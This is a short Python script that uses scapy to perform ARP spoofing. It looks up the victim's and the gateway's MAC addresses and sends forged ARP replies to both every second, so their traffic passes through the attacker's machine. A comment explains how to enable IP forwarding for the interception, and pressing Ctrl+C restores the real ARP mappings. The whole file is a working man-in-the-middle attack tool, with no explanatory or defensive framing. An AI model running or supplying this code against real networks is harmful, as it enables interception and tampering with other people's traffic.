from scapy.all import Ether, ARP, srp, send
import time

##### ip forwarding aktivieren: apple -> sudo sysctl -w net.inet.ip.forwarding=1

def mac_addr(ip):
    mac, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3)
    if mac:
        return mac[0][1].src

def spoof(victim_ip, victim_mac, gateway_ip):
    arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, op=2)
    send(arp_response)

def unspoof(victim_ip, victim_mac, gateway_ip, gateway_mac):
    arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac, op=2)
    send(arp_response, count=3)

if __name__ == "__main__":
    
    victim_ip = input("Victim IP Address? ")
    gateway_ip = input("Gateway IP Address? ")
    victim_mac = mac_addr(victim_ip)
    gateway_mac = mac_addr(gateway_ip)
    
   # target_mac = "08:00:27:1c:53:83"
   # target_ip = "192.168.178.99"
   # gateway_mac = "3c:a6:2f:54:54:65"
   # gateway_ip = "192.168.178.1" 
    
    print("Starting Spoof, press CTRL+C to unspoof.")
    try:
        while True:
            spoof(victim_ip, victim_mac, gateway_ip)
            spoof(gateway_ip, gateway_mac, victim_ip)
            time.sleep(1)
    except KeyboardInterrupt:
        print("CTRL+C detected")
        unspoof(victim_ip, victim_mac, gateway_ip, gateway_mac)
        unspoof(gateway_ip, gateway_mac, victim_ip, victim_mac)
